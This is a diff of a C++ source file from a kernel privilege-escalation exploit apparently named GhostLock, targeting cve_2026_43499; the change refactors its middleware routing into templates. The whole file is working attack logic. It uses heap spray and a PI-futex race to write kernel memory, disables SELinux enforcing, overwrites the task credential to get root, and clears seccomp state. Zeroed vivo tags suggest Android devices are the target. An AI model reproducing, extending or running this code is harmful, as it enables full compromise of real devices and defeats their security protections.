@@ -2,10 +2,11 @@
  * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
  *
  * The setup stage, the W1-W3 step sequence and the shared write/retry
- * primitives moved out of ExploitProcedure (which retired). The body is
- * unchanged: same statements, same order, same log text; only the receiver is
- * now an ExploitSession parameter and the middleware route hooks are called
- * through route/middleware_hooks.hpp (Batch 4 slice 3c).
+ * primitives moved out of the retired ExploitProcedure. The middleware policy
+ * is a template parameter: route hooks are direct static calls on `Middleware`
+ * (Batch 4 review P1-B), so the catalogued middleware each instantiate their
+ * own backend code. The body is otherwise unchanged: same statements, same
+ * order, same log text.
  */
 
 #include "session/backend/cve_2026_43499_backend.hpp"
@@ -16,9 +17,9 @@
 #include "kernelsnitch/utils.h"
 #include "profile/macros.h"
 #include "race/threads.hpp"
-#include "route/middleware_hooks.hpp"
 #include "route/route_api.hpp"
 #include "route/route_middleware.hpp"
+#include "route/route_policy.hpp"
 #include "session/handoff_probe.hpp"
 #include "session/victim_process.hpp"
 #include "support/decls.hpp"
@@ -28,11 +29,14 @@
 
 #include <array>
 #include <cstdint>
+#include <optional>
 #include <string_view>
+#include <utility>
 
 namespace ghostlock::session::backend {
     namespace {
         /* Shared write/retry sequence. */
+        template <class M>
         Status retry_write_stage(
             ExploitSession &session,
             const char *stage,
@@ -65,9 +69,9 @@ namespace ghostlock::session::backend {
                     attack::slab_drain();
                 }
                 if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
-                    if (!route::middleware::w2_fast_repair_prebuild(session)) return false;
+                    if (!M::w2_fast_repair_prebuild(session)) return false;
                 }
-                Status routed = Cve2026_43499Policy::attack_write(session, request, stage);
+                Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                 if (!routed) {
                     support::discard_prebuilt_page();
                     pr_warning("%s attempt %u route failed; backing off\n", stage, attempt);
@@ -75,7 +79,7 @@ namespace ghostlock::session::backend {
                     continue;
                 }
                 if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
-                    if (!route::middleware::w2_fast_repair_activate(session)) return false;
+                    if (!M::w2_fast_repair_activate(session)) return false;
                 }
                 if (settle_usec) usleep(settle_usec);
                 if (verify(context)) return true;
@@ -107,6 +111,7 @@ namespace ghostlock::session::backend {
 
         /* Spawn one victim, clear the vivo tag (when built) and write the credential.
          * Retry means the perf leak missed and the chain should respawn. */
+        template <class M>
         VictimRound w2(ExploitSession &session, VictimChain &chain,
                        victim::w2_stage_context &w2_context,
                        uintptr_t &child_task) {
@@ -190,14 +195,14 @@ namespace ghostlock::session::backend {
                     /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
-                    vr_ok &= Cve2026_43499Policy::attack_write(session, flags_request, "VR: flags+tagA");
+                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
 
                     /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
                     if (vr_ok) {
                         uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
-                        vr_ok &= Cve2026_43499Policy::attack_write(session, tagb_request, "VR: tagB");
+                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
                     }
 
                     if (vr_ok) {
@@ -208,7 +213,7 @@ namespace ghostlock::session::backend {
                 }
             }
 
-            Status got_root = retry_write_stage(
+            Status got_root = retry_write_stage<M>(
                 session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                 g_exploit_session.profile.w2_attempts(),
                 g_exploit_session.profile.w2_settle_us(),
@@ -229,6 +234,7 @@ namespace ghostlock::session::backend {
 
         /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
          * child probe reports a filter-free fork. */
+        template <class M>
         bool w3(ExploitSession &session, VictimChain &chain,
                 victim::w2_stage_context &w2_context,
                 uintptr_t child_task) {
@@ -249,13 +255,13 @@ namespace ghostlock::session::backend {
                 return true;
             }
 
-            const bool exact_target = route::middleware::w3_exact_target(session.profile);
+            constexpr bool exact_target = M::w3_exact_target;
             victim::w3_stage_context w3_context = {
                 .pipes = pipes,
                 .leaf_to_target8 = !exact_target,
             };
             if (!exact_target) {
-                Status dir_ok = retry_write_stage(
+                Status dir_ok = retry_write_stage<M>(
                     session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                     victim::verify_leaf_dir_stage, &w3_context, 1);
                 if (!dir_ok) {
@@ -281,7 +287,7 @@ namespace ghostlock::session::backend {
                 if (attempt == 1) attack::slab_drain();
                 const memory::WriteRequest flags_request =
                         memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
-                Status routed = Cve2026_43499Policy::attack_write(session, flags_request, "W3: TIF_SECCOMP");
+                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
                 if (!routed) {
                     pr_warning("W3 attempt %u route failed; backing off\n", attempt);
                     usleep(100000);
@@ -290,7 +296,7 @@ namespace ghostlock::session::backend {
                 usleep(g_exploit_session.profile.w3_settle_us());
                 const memory::WriteRequest mode_request =
                         memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
-                routed = Cve2026_43499Policy::attack_write(session, mode_request, "W3: seccomp mode");
+                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
                 if (!routed) {
                     pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
                     usleep(100000);
@@ -319,42 +325,49 @@ namespace ghostlock::session::backend {
             return true;
         }
 
-        /* W1b: the resolved middleware (multicast, non-resident) repairs its private
-         * scratch page before W2. The body stays here because it calls the shared
-         * write primitive; the policy projection decides whether it is needed. */
+        /* W1b: the non-resident multicast middleware repairs its private scratch
+         * page before W2. The body stays here because it calls the shared write
+         * primitive; whether it is needed is a capability of the middleware. */
+        template <class M>
         bool w1_scratch_repair(ExploitSession &session) {
-            if (!route::middleware::needs_scratch_repair(session.profile)) return true;
-            const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
-            const uintptr_t w1_scratch_poison =
-                    (session.heap.current.base) + mcast.buffer_size;
-            if (!support::quarantine_reclaim_sockets()) {
-                pr_warning("W1 scratch page quarantine failed\n");
+            if constexpr (!M::multicast) {
+                return true;
+            } else {
+                if (session.profile.multicast_resident()) return true;
+                const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
+                const uintptr_t w1_scratch_poison =
+                        (session.heap.current.base) + mcast.buffer_size;
+                if (!support::quarantine_reclaim_sockets()) {
+                    pr_warning("W1 scratch page quarantine failed\n");
+                    return false;
+                }
+                int32_t repaired = 0;
+                const uint32_t repair_attempts =
+                        g_exploit_session.profile.w1_scratch_repair_attempts();
+                for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
+                    pr_info("W1b: private scratch repair attempt %u/%u\n",
+                            repair_try, repair_attempts);
+                    const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
+                        w1_scratch_poison, memory::WriteMode::Zero, 1);
+                    if (Cve2026_43499Policy::template attack_write<M>(
+                            session, scratch_repair, "W1b: private scratch repair")) {
+                        repaired = 1;
+                        break;
+                    }
+                    usleep(50000);
+                }
+                if (repaired) {
+                    pr_success("private scratch repaired; releasing quarantine\n");
+                    support::release_quarantined_reclaim_sockets();
+                    return true;
+                }
+                pr_warning("private scratch repair failed; keeping page quarantined\n");
                 return false;
             }
-            int32_t repaired = 0;
-            const uint32_t repair_attempts =
-                    g_exploit_session.profile.w1_scratch_repair_attempts();
-            for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
-                pr_info("W1b: private scratch repair attempt %u/%u\n",
-                        repair_try, repair_attempts);
-                const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
-                    w1_scratch_poison, memory::WriteMode::Zero, 1);
-                if (Cve2026_43499Policy::attack_write(session, scratch_repair, "W1b: private scratch repair")) {
-                    repaired = 1;
-                    break;
-                }
-                usleep(50000);
-            }
-            if (repaired) {
-                pr_success("private scratch repaired; releasing quarantine\n");
-                support::release_quarantined_reclaim_sockets();
-                return true;
-            }
-            pr_warning("private scratch repair failed; keeping page quarantined\n");
-            return false;
         }
 
-        /* Stage: W1 SELinux plus the route-specific scratch / resident repair. */
+        /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
+        template <class M>
         StageResult w1(ExploitSession &session) {
             /* W1: disable SELinux before task discovery. untrusted_app may not be able
          * to read enforce while it is still enforcing, so attempt W1 regardless. */
@@ -365,8 +378,11 @@ namespace ghostlock::session::backend {
                 }
                 attack::timer_mark("pre-W1 drain");
                 uint32_t w1_attempts = g_exploit_session.profile.w1_attempts();
-                w1_attempts = route::middleware::w1_attempt_cap(session.profile, w1_attempts);
-                selinux_ok = retry_write_stage(
+                if constexpr (M::multicast) {
+                    /* a non-resident multicast write cannot safely retry a missed W1 */
+                    if (!session.profile.multicast_resident()) w1_attempts = 1;
+                }
+                selinux_ok = retry_write_stage<M>(
                     session,
                     "W1: SELinux",
                     session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
@@ -379,8 +395,8 @@ namespace ghostlock::session::backend {
                     route::kernel5_resident_stop();
                     return StageResult::Failed;
                 }
-                if (!w1_scratch_repair(session)) return StageResult::Failed;
-                if (!route::middleware::w1_resident_repair(session)) return StageResult::Failed;
+                if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
+                if (!M::w1_resident_repair(session)) return StageResult::Failed;
                 attack::timer_mark("Write 1 complete");
             } else {
                 pr_success("SELinux already permissive\n");
@@ -433,6 +449,7 @@ namespace ghostlock::session::backend {
 
     /* One route write: middleware resident fast path, else heap spray + PI race.
      * Shared statement order; the middleware policy decides the resident step. */
+    template <class M>
     Status Cve2026_43499Policy::attack_write(ExploitSession &session,
                                              const memory::WriteRequest &request,
                                              const char *desc) {
@@ -447,8 +464,7 @@ namespace ghostlock::session::backend {
         /* Both transports write *(target) := value through the erase left-only
          * relink: waiter words are {pc = value, right = 0, left = target} and
          * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
-        if (const std::optional<Status> handled =
-                    route::middleware::resident_write(session, request)) {
+        if (const std::optional<Status> handled = M::resident_write(session, request)) {
             return *handled;
         }
 
@@ -470,6 +486,7 @@ namespace ghostlock::session::backend {
         return routed;
     }
 
+    template <class M>
     StageResult Cve2026_43499Policy::run(ExploitSession &session,
                                          const profile::kernel_offsets &decoded,
                                          const char *debug_dir, bool force_attack,
@@ -482,7 +499,7 @@ namespace ghostlock::session::backend {
             case StageResult::Continue:
                 break;
         }
-        switch (w1(session)) {
+        switch (w1<M>(session)) {
             case StageResult::Failed:
                 return StageResult::Failed;
             case StageResult::Done:
@@ -501,10 +518,10 @@ namespace ghostlock::session::backend {
             if (round > 1) park_retry_child(session, chain, round, chain_rounds);
 
             uintptr_t child_task = 0;
-            const VictimRound rooted = w2(session, chain, w2_context, child_task);
+            const VictimRound rooted = w2<M>(session, chain, w2_context, child_task);
             if (rooted == VictimRound::Failed) return StageResult::Failed;
             if (rooted == VictimRound::Retry) continue;
-            if (w3(session, chain, w2_context, child_task)) break;
+            if (w3<M>(session, chain, w2_context, child_task)) break;
         }
         if (!chain.seccomp_ok) {
             pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
@@ -513,4 +530,20 @@ namespace ghostlock::session::backend {
         /* The frontend handoff step finishes the run. */
         return StageResult::Continue;
     }
+
+    /* Explicit instantiations: the catalogued middleware policies. Callers only
+     * include the header; the definitions stay in this unit. */
+    template StageResult Cve2026_43499Policy::run<route::SelectPolicy>(
+        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
+    template StageResult Cve2026_43499Policy::run<route::TcpPolicy>(
+        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
+    template StageResult Cve2026_43499Policy::run<route::MulticastPolicy>(
+        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
+
+    template Status Cve2026_43499Policy::attack_write<route::SelectPolicy>(
+        ExploitSession &, const memory::WriteRequest &, const char *);
+    template Status Cve2026_43499Policy::attack_write<route::TcpPolicy>(
+        ExploitSession &, const memory::WriteRequest &, const char *);
+    template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
+        ExploitSession &, const memory::WriteRequest &, const char *);
 } // namespace ghostlock::session::backend
